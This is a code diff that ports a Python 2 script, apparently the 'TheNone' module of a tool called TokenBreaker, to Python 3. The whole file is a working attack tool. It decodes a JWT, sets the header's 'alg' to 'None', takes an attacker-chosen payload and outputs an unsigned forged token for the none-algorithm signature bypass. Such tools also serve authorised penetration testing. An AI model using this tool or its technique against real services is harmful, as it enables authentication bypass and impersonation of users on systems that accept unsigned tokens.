@@ -1,67 +1,59 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from __future__ import print_function
 
-import argparse
-import base64
-import re
-from sys import exit
+from naryal2580.style import info, coolInput, good
+from argparse import ArgumentParser
+from base64 import b64decode, b64encode
+from re import sub as reSubst
 
-def info(txt): return '[\033[1m\033[36m*\033[0m] \033[34m'+str(txt)+'\033[0m'
-def bad(txt): return '[\033[1m\033[31m-\033[0m] \033[31m'+str(txt)+'\033[0m'
-def warning(txt): return'[\033[1m\033[33m!\033[0m] \033[33m'+str(txt)+'\033[0m'
-def good(txt): return '[\033[1m\033[32m+\033[0m] \033[32m'+str(txt)+'\033[0m'
-def cool_input(text):
-    try:
-        _input = raw_input('[\033[1m\033[35m<\033[0m] \033[35m{}:\033[0m \033[3m'.format(text))
-        print('\033[0m', end='')
-        return _input
-    except KeyboardInterrupt:
-        print('\b\b  \033[0m')
-        print(bad('Exitting via Keyboard Interruption.'))
-        exit(0)
-    except EOFError:
-        print('\033[0m')
-        print(bad('Terminating!'))
-        exit(0)
 
 def banner():
-    logo = '\033[1m ________         _  __\n/_  __/ /  ___   / |/ /__  ___  ___\n / / / _ \\/ -_) /    / _ \\/ _ \\/ -_)\n/_/ /_//_/\\__/ /_/|_/\\___/_//_/\\__/\n\033[0m'
+    logo = '\033[1m ________         _  __\n/_  __/ /  ___   / |/ /__  ___  __'
+    logo += '_\n / / / _ \\/ -_) /    / _ \\/ _ \\/ -_)\n/_/ /_//_/\\__/ /_/|_'
+    logo += '/\\___/_//_/\\__/\n\033[0m'
     print(logo)
+
 
 def verify_Padding(data):
     missing_padding = len(data) % 4
     if missing_padding != 0:
-        data += b'='* (4 - missing_padding)
+        data += '=' * (4 - missing_padding)
     return data
 
-def processTheNoneToken(token):
-    header=base64.b64decode(verify_Padding(token.split('.')[0]))
-    payload=base64.b64decode(verify_Padding(token.split('.')[1]))
-    print(info("Decoded Header value: {}".format(header)))
-    print(info("Decoded Payload value: {}".format(payload)))
-    header=re.sub('"alg":".{5}"','"alg":"None"',header)
-    print(info("New header value with none algorithm: {}".format(header)))
 
-    modify_response = cool_input("Modify Header? [y/N]")
+def processTheNoneToken(token):
+    header = b64decode(verify_Padding(token.split('.')[0]))
+    payload = b64decode(verify_Padding(token.split('.')[1]))
+    print(info("Decoded Header value -> {}".format(header.decode())))
+    print(info("Decoded Payload value -> {}".format(payload.decode())))
+    header = reSubst(b'"alg":".{5}"', b'"alg":"None"', header)
+    print(info("New header with 'alg' > 'none' -> {}".format(header.decode())))
+
+    modify_response = coolInput("Modify Header? [y/N]")
     if modify_response.lower() == 'y':
-        header = cool_input("Enter your header with 'alg' field set to 'None'")
-        print(info("Header set to: " + header))
-    payload = cool_input("Enter your payload")
-    base64header = base64.b64encode(header).rstrip('=')
-    base64payload = base64.b64encode(payload).rstrip('=')
-    finaljwt = base64header + '.' + base64payload + "."
-    print(good("Successfully encoded Token: {}".format(finaljwt)))
+        header = coolInput("Enter your header with 'alg' field set to 'None'")
+        header = header.encode()
+        print(info("Header set to -> " + header.decode()))
+    payload = coolInput("Enter your payload")
+    base64header = b64encode(header).rstrip(b'=')
+    base64payload = b64encode(payload.encode()).rstrip(b'=')
+    finaljwt = base64header + b'.' + base64payload + b"."
+    print(good("Successfully encoded Token -> {}".format(finaljwt.decode())))
+
 
 def main():
-    parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
-            epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n')
-    requiredparser=parser.add_argument_group('required arguments')
-    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
+    parser = ArgumentParser(
+        description='TokenBreaker: 1.TheNoneAlgorithm',
+        epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n'
+        )
+    requiredparser = parser.add_argument_group('required arguments')
+    requiredparser.add_argument('-t', '--token', help="JWT Token value",
+                                required=True)
     args = parser.parse_args()
     banner()
     processTheNoneToken(args.token)
 
-if __name__=='__main__':
+
+if __name__ == '__main__':
     main()
